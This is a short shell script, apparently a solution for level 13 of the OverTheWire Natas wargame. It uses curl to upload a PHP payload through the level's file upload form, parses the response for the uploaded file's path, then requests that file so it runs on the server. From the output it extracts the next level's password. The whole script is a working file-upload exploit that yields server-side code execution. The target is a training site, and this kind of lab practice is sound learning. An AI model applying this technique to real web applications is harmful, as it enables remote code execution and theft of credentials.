#!/bin/echo Please source

payloadUrl=natas13.natas.labs.overthewire.org/$(curl -s -u natas13:$natas13pass -X POST -F MAX_FILE_SIZE=1000 -F filename=payload.php -F submit="" -F uploadedfile=@natas13/payload.php natas13.natas.labs.overthewire.org | grep "The file <a href=\"upload/" | sed -rE 's;The file <a href=\"(upload/.+?\.php)\".*;\1;')
export natas14pass=$(curl -s -u natas13:$natas13pass $payloadUrl | strings | grep -E '.{32}')
echo natas14: $natas14pass
